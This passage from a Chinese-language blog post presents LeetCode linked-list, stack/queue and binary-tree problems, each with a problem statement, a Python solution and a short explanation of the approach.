class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            seen.add(head)</span><br><span class="line">            head = head.<span class="built_in">next</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>


<h4 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h4><p>【哈希表】：最容易想到的方法是遍历所有节点，每次遍历到一个节点时，判断该节点此前是否被访问过。</p>
<ul>
<li>使用哈希表来存储所有已经访问过的节点。</li>
<li>每次到达一个节点，如果该节点已经存在于哈希表中，则说明该链表是环形链表，否则就将该节点加入哈希表中。</li>
<li>重复这一过程，直到遍历完整个链表即可。</li>
</ul>
<h3 id="21-合并两个有序链表-【简单】"><a href="#21-合并两个有序链表-【简单】" class="headerlink" title="21. 合并两个有序链表 【简单】"></a>21. 合并两个有序链表 【简单】</h3><h4 id="题目描述-14"><a href="#题目描述-14" class="headerlink" title="题目描述"></a>题目描述</h4><p>将两个升序链表合并为一个新的 <strong>升序</strong> 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。</p>
<p><strong>示例 1：</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/21.jpeg"><br><code>输入：l1 = [1,2,4], l2 = [1,3,4] 输出：[1,1,2,3,4,4]</code></p>
<p><strong>示例 2：</strong><br><code>输入：l1 = [], l2 = [] 输出：[]</code></p>
<p><strong>示例 3：</strong><br><code>输入：l1 = [], l2 = [0] 输出：[0]</code></p>
<h4 id="代码-14"><a href="#代码-14" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, next=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.next = next</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mergeTwoLists</span>(<span class="params">self, list1, list2</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type list1: Optional[ListNode]</span></span><br><span class="line"><span class="string">        :type list2: Optional[ListNode]</span></span><br><span class="line"><span class="string">        :rtype: Optional[ListNode]</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> list1: </span><br><span class="line">            <span class="keyword">return</span> list2</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> list2:</span><br><span class="line">            <span class="keyword">return</span> list1</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> list1.val &lt;= list2.val:</span><br><span class="line">            list1.<span class="built_in">next</span> = self.mergeTwoLists(list1.<span class="built_in">next</span>, list2)</span><br><span class="line">            <span class="keyword">return</span> list1</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            list2.<span class="built_in">next</span> = self.mergeTwoLists(list1, list2.<span class="built_in">next</span>)</span><br><span class="line">            <span class="keyword">return</span> list2</span><br></pre></td></tr></table></figure>


<h4 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h4><p>【递归】：函数在运行时调用自己，这个函数就叫递归函数，调用的过程叫做递归。<br>比如定义函数 <code>f(x)=x+f(x-1)f(x)=x+f(x−1)</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x + f(x-<span class="number">1</span>)</span><br></pre></td></tr></table></figure>



<h3 id="203-移除链表元素-【简单】"><a href="#203-移除链表元素-【简单】" class="headerlink" title="203. 移除链表元素 【简单】"></a>203. 移除链表元素 【简单】</h3><h4 id="题目描述-15"><a href="#题目描述-15" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你一个链表的头节点 <code>head</code> 和一个整数 <code>val</code> ，请你删除链表中所有满足 <code>Node.val == val </code>的节点，并返回 <strong>新的头节点</strong> 。<br> <br><strong>示例 1：</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/203.jpeg"><br><code>输入：head = [1,2,6,3,4,5,6], val = 6 输出：[1,2,3,4,5]</code></p>
<p><strong>示例 2：</strong><br><code>输入：head = [], val = 1 输出：[]</code></p>
<p><strong>示例 3：</strong><br><code>输入：head = [7,7,7,7], val = 7 输出：[]</code></p>
<h4 id="代码-15"><a href="#代码-15" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, next=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.next = next</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeElements</span>(<span class="params">self, head, val</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type head: ListNode</span></span><br><span class="line"><span class="string">        :type val: int</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        ini = ListNode(-<span class="number">1</span>, head)</span><br><span class="line">        p = ini</span><br><span class="line">        <span class="keyword">while</span> p.<span class="built_in">next</span>:</span><br><span class="line">            <span class="keyword">if</span> p.<span class="built_in">next</span>.val == val:</span><br><span class="line">                p.<span class="built_in">next</span> = p.<span class="built_in">next</span>.<span class="built_in">next</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                p = p.<span class="built_in">next</span></span><br><span class="line">        <span class="keyword">return</span> ini.<span class="built_in">next</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h4 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h4><ul>
<li>初始化一个头结点 ini ，指针指向链表 head，对 p 赋予 ini 一样的值方便遍历；</li>
<li>循环 p 指针向后遍历, 如果 p.next.val 相等, 则需要跳过 p.next 节点连接 p.next.next </li>
<li>最后返回头节点的指针指向的链表</li>
</ul>
<p>该题也可以用递归。</p>
<h2 id="第8天-链表"><a href="#第8天-链表" class="headerlink" title="第8天 链表"></a>第8天 链表</h2><h3 id="206-反转链表-【简单】"><a href="#206-反转链表-【简单】" class="headerlink" title="206. 反转链表 【简单】"></a>206. 反转链表 【简单】</h3><h4 id="题目描述-16"><a href="#题目描述-16" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你单链表的头节点 <code>head</code> ，请你反转链表，并返回反转后的链表。</p>
<p><strong>示例 1：</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/206-1.jpeg"><br><code>输入：head = [1,2,3,4,5] 输出：[5,4,3,2,1]</code></p>
<p><strong>示例 2：</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/206-2.jpeg"><br><code>输入：head = [1,2] 输出：[2,1]</code></p>
<p><strong>示例 3：</strong><br><code>输入：head = [] 输出：[]</code></p>
<h4 id="代码-16"><a href="#代码-16" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, next=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.next = next</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverseList</span>(<span class="params">self, head</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type head: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        pre = <span class="literal">None</span></span><br><span class="line">        curr = head</span><br><span class="line">        <span class="keyword">while</span>(curr):</span><br><span class="line">            tmp = curr.<span class="built_in">next</span></span><br><span class="line">            curr.<span class="built_in">next</span> = pre</span><br><span class="line">            pre = curr</span><br><span class="line">            curr = tmp</span><br><span class="line">        <span class="keyword">return</span> pre</span><br></pre></td></tr></table></figure>


<h4 id="分析-16"><a href="#分析-16" class="headerlink" title="分析"></a>分析</h4><p>申请两个指针，第一个指针叫 pre，最初是指向 null 的；第二个指针 cur 指向 head。</p>
<ul>
<li>不断遍历 cur，每次迭代到 cur，都将 cur 的 next 指向 pre，然后 pre 和 cur 前进一位</li>
<li>迭代完后(cur 变成 null 了)，pre 就是最后一个节点了（且向前指）</li>
</ul>
<h3 id="83-删除排序链表中的重复元素-【简单】"><a href="#83-删除排序链表中的重复元素-【简单】" class="headerlink" title="83. 删除排序链表中的重复元素 【简单】"></a>83. 删除排序链表中的重复元素 【简单】</h3><h4 id="题目描述-17"><a href="#题目描述-17" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个已排序的链表的头 <code>head</code> ， <strong>删除所有重复的元素，使每个元素只出现一次</strong> 。返回 <strong>已排序的链表</strong> 。</p>
<p><strong>示例 1：</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/83-1.jpeg"><br><code>输入：head = [1,1,2] 输出：[1,2]</code></p>
<p><strong>示例 2：</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/83-2.jpeg"><br><code>输入：head = [1,1,2,3,3] 输出：[1,2,3]</code></p>
<h4 id="代码-17"><a href="#代码-17" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, next=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.next = next</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deleteDuplicates</span>(<span class="params">self, head</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type head: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        value = []</span><br><span class="line">        pre = <span class="literal">None</span></span><br><span class="line">        curr = head</span><br><span class="line">        <span class="keyword">while</span> curr:</span><br><span class="line">            <span class="keyword">if</span> curr.val <span class="keyword">in</span> value:</span><br><span class="line">                pre.<span class="built_in">next</span> = curr.<span class="built_in">next</span></span><br><span class="line">                curr = curr.<span class="built_in">next</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                value.append(curr.val)</span><br><span class="line">                pre = curr</span><br><span class="line">                curr = curr.<span class="built_in">next</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">return</span> head</span><br></pre></td></tr></table></figure>


<h4 id="分析-17"><a href="#分析-17" class="headerlink" title="分析"></a>分析</h4><p>一个指向前一个结点指针 pre，一个指向当前指针 curr， 一个存储链表值的列表 value</p>
<ul>
<li>判断当前指针结点的值是否在列表 value 内：<ul>
<li>已存在则删掉该结点</li>
<li>不在则添加 val 到列表，并将两个指针向前一步</li>
</ul>
</li>
</ul>
<h2 id="第9天-栈-队列"><a href="#第9天-栈-队列" class="headerlink" title="第9天 栈/队列"></a>第9天 栈/队列</h2><h3 id="20-有效的括号-【简单】"><a href="#20-有效的括号-【简单】" class="headerlink" title="20. 有效的括号 【简单】"></a>20. 有效的括号 【简单】</h3><h4 id="题目描述-18"><a href="#题目描述-18" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个只包括 <code>&#39;(&#39;</code>，<code>&#39;)&#39;</code>，<code>&#39;&#123;&#39;</code>，<code>&#39;&#125;&#39;</code>，<code>&#39;[&#39;</code>，<code>&#39;]&#39;</code> 的字符串 <code>s</code> ，判断字符串是否有效。</p>
<p>有效字符串需满足：</p>
<ul>
<li>左括号必须用相同类型的右括号闭合。</li>
<li>左括号必须以正确的顺序闭合。</li>
<li>每个右括号都有一个对应的相同类型的左括号。</li>
</ul>
<p><strong>示例 1：</strong><br><code>输入：s = &quot;()&quot; 输出：true</code></p>
<p><strong>示例 2：</strong><br><code>输入：s = &quot;()[]&#123;&#125;&quot; 输出：true</code></p>
<p><strong>示例 3：</strong><br><code>输入：s = &quot;(]&quot; 输出：false</code></p>
<h4 id="代码-18"><a href="#代码-18" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isValid</span>(<span class="params">self, s</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(s) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        pairs = &#123;</span><br><span class="line">            <span class="string">&quot;)&quot;</span>: <span class="string">&quot;(&quot;</span>,</span><br><span class="line">            <span class="string">&quot;]&quot;</span>: <span class="string">&quot;[&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&#125;&quot;</span>: <span class="string">&quot;&#123;&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        stack = <span class="built_in">list</span>()</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span> ch <span class="keyword">in</span> pairs:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> stack <span class="keyword">or</span> stack[-<span class="number">1</span>] != pairs[ch]:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                stack.pop()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                stack.append(ch)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">not</span> stack</span><br></pre></td></tr></table></figure>


<h4 id="分析-18"><a href="#分析-18" class="headerlink" title="分析"></a>分析</h4><p>首先判断字符串个数是否双数，如果不是可以直接返回 False；<br>创建一个列表栈 stack，定义 pairs 字典，指定右半符号对应的左半（用右半对比左半是否一对）；<br>遍历字符串中的字符 ch：<br>    如果它在字典 pairs （键值/右半）里面：<br>        判断如果栈为空 或 栈中最后一个符号不等于该符号的左半，则返回 False；<br>        不然弹出栈中的左半符号；<br>    不然如果不在字典中（不是右半符号）：<br>        栈中加入该符号（左半）<br>最后如果栈为空（对应符号全部配对）则返回 True </p>
<h3 id="232-用栈实现对列-【简单】"><a href="#232-用栈实现对列-【简单】" class="headerlink" title="232. 用栈实现对列 【简单】"></a>232. 用栈实现对列 【简单】</h3><h4 id="题目描述-19"><a href="#题目描述-19" class="headerlink" title="题目描述"></a>题目描述</h4><p>请你仅使用两个栈实现先入先出队列。队列应当支持一般队列支持的所有操作（<code>push</code>、<code>pop</code>、<code>peek</code>、<code>empty</code>）：</p>
<p>实现 <code>MyQueue</code> 类：</p>
<ul>
<li><code>void push(int x)</code> 将元素 x 推到队列的末尾</li>
<li><code>int pop()</code> 从队列的开头移除并返回元素</li>
<li><code>int peek()</code> 返回队列开头的元素</li>
<li><code>boolean empty()</code> 如果队列为空，返回 <code>true</code> ；否则，返回 <code>false</code></li>
</ul>
<p><strong>说明：</strong></p>
<p>你 <strong>只能</strong> 使用标准的栈操作 —— 也就是只有 <code>push to top</code>, <code>peek/pop from top</code>, <code>size</code>, 和 <code>is empty</code> 操作是合法的。<br>你所使用的语言也许不支持栈。你可以使用 list 或者 deque（双端队列）来模拟一个栈，只要是标准的栈操作即可。</p>
<p><strong>示例 1：</strong><br><code>输入： [&quot;MyQueue&quot;, &quot;push&quot;, &quot;push&quot;, &quot;peek&quot;, &quot;pop&quot;, &quot;empty&quot;] [[], [1], [2], [], [], []] 输出： [null, null, null, 1, 1, false] 解释： MyQueue myQueue = new MyQueue(); myQueue.push(1); // queue is: [1] myQueue.push(2); // queue is: [1, 2] (leftmost is front of the queue) myQueue.peek(); // return 1 myQueue.pop(); // return 1, queue is [2] myQueue.empty(); // return false</code></p>
<h4 id="代码-19"><a href="#代码-19" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyQueue</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.left = []</span><br><span class="line">        self.right = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type x: int</span></span><br><span class="line"><span class="string">        :rtype: None</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.left.append(x)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.right:</span><br><span class="line">            <span class="keyword">while</span> self.left:</span><br><span class="line">                self.right.append(self.left.pop())</span><br><span class="line">        <span class="keyword">return</span> self.right.pop()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">peek</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.right:</span><br><span class="line">            <span class="keyword">return</span> self.left[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.right[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">empty</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.left <span class="keyword">and</span> <span class="keyword">not</span> self.right:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Your MyQueue object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># obj = MyQueue()</span></span><br><span class="line"><span class="comment"># obj.push(x)</span></span><br><span class="line"><span class="comment"># param_2 = obj.pop()</span></span><br><span class="line"><span class="comment"># param_3 = obj.peek()</span></span><br><span class="line"><span class="comment"># param_4 = obj.empty()</span></span><br></pre></td></tr></table></figure>


<h4 id="分析-19"><a href="#分析-19" class="headerlink" title="分析"></a>分析</h4><p>两个栈构成对列：一个进、一个出 （以此达到先入先出的条件）</p>
<ul>
<li>push：直接入队，向入栈添加元素</li>
<li>pop()：如果出栈为空，将入栈的元素移到出栈；然后移除出栈的最上面元素（列表的-1）</li>
<li>peek()：如果出栈不为空，即是出栈的最上面元素（列表的倒数第一个）；反之即是入栈的最下面元素（列表的第一个）</li>
<li>empty()：判断两个栈内有无元素</li>
</ul>
<h2 id="第10天-树"><a href="#第10天-树" class="headerlink" title="第10天 树"></a>第10天 树</h2><h3 id="144-二叉树的前序遍历-【简单】"><a href="#144-二叉树的前序遍历-【简单】" class="headerlink" title="144. 二叉树的前序遍历 【简单】"></a>144. 二叉树的前序遍历 【简单】</h3><h4 id="题目描述-20"><a href="#题目描述-20" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你二叉树的根节点 <code>root</code> ，返回它节点值的 <strong>前序</strong> 遍历。</p>
<p><strong>示例 1：</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/144-1.jpeg"><br><code>输入：root = [1,null,2,3] 输出：[1,2,3]</code></p>
<p><strong>示例 2：</strong><br><code>输入：root = [] 输出：[]</code></p>
<p><strong>示例 3：</strong><br><code>输入：root = [1] 输出：[1]</code></p>
<p><strong>示例 4：</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/144-2.jpeg"><br><code>输入：root = [1,2] 输出：[1,2]</code></p>
<p><strong>示例 5：</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/144-3.jpeg"><br><code>输入：root = [1,null,2] 输出：[1,2]</code></p>
<h4 id="代码-20"><a href="#代码-20" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">preorderTraversal</span>(<span class="params">self, root</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">preorder</span>(<span class="params">root</span>):</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            res.append(root.val)</span><br><span class="line">            preorder(root.left)</span><br><span class="line">            preorder(root.right)</span><br><span class="line">        </span><br><span class="line">        res = []</span><br><span class="line">        preorder(root)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>


<h4 id="分析-20"><a href="#分析-20" class="headerlink" title="分析"></a>分析</h4><p><strong>前序遍历：</strong> 遍历根结点的顺序为中左右<br>采用递归调用函数的方法：<br>    + 判断根结点为空时停止<br>    + 记录根结点数值 val，遍历左根结点，然后遍历右根结点<br>创建一个列表记录结点数值，然后传入根结点调用递归函数即可，最后输出列表</p>
<h3 id="94-二叉树的中序遍历-【简单】"><a href="#94-二叉树的中序遍历-【简单】" class="headerlink" title="94. 二叉树的中序遍历 【简单】"></a>94. 二叉树的中序遍历 【简单】</h3><h4 id="题目描述-21"><a href="#题目描述-21" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个二叉树的根节点 <code>root</code> ，返回 它的 <strong>中序</strong> 遍历 。</p>
<p><strong>示例 1：</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/94-1.jpeg"><br><code>输入：root = [1,null,2,3] 输出：[1,3,2]</code></p>
<p><strong>示例 2：</strong><br><code>输入：root = [] 输出：[]</code></p>
<p><strong>示例 3：</strong><br><code>输入：root = [1] 输出：[1]</code></p>
<h4 id="代码-21"><a href="#代码-21" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inorderTraversal</span>(<span class="params">self, root</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">inorder</span>(<span class="params">root</span>):</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            inorder(root.left)</span><br><span class="line">            res.append(root.val)</span><br><span class="line">            inorder(root.right)</span><br><span class="line">        </span><br><span class="line">        res = []</span><br><span class="line">        inorder(root)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h4 id="分析-21"><a href="#分析-21" class="headerlink" title="分析"></a>分析</h4><p><strong>中序遍历：</strong> 遍历根结点的顺序为左中右<br>同理采用递归法，递归函数中判断根结点为空就停止：<br>    先遍历左根结点，再记录根结点的值，然后遍历右根结点</p>
<h3 id="145-二叉树的后序遍历-【简单】"><a href="#145-二叉树的后序遍历-【简单】" class="headerlink" title="145. 二叉树的后序遍历 【简单】"></a>145. 二叉树的后序遍历 【简单】</h3><h4 id="题目描述-22"><a href="#题目描述-22" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你一棵二叉树的根节点 <code>root</code> ，返回其节点值的 <strong>后序遍历</strong> 。</p>
<p><strong>示例 1</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/145-1.jpeg"><br><code>输入：root = [1,null,2,3] 输出：[3,2,1]</code></p>
<p><strong>示例 2：</strong><br><code>输入：root = [] 输出：[]</code></p>
<p><strong>示例 3：</strong><br><code>输入：root = [1] 输出：[1]</code></p>
<h4 id="代码-22"><a href="#代码-22" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">postorderTraversal</span>(<span class="params">self, root</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">postorder</span>(<span class="params">root</span>):</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            </span><br><span class="line">            postorder(root.left)</span><br><span class="line">            postorder(root.right)</span><br><span class="line">            res.append(root.val)</span><br><span class="line">        </span><br><span class="line">        res = []</span><br><span class="line">        postorder(root)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h4 id="分析-22"><a href="#分析-22" class="headerlink" title="分析"></a>分析</h4><p><strong>后序遍历：</strong> 遍历根结点的顺序为左右中<br>同理采用递归法，递归函数中判断根结点为空就停止：<br>    先遍历左根结点，然后遍历右根结点，再记录根结点的值</p>
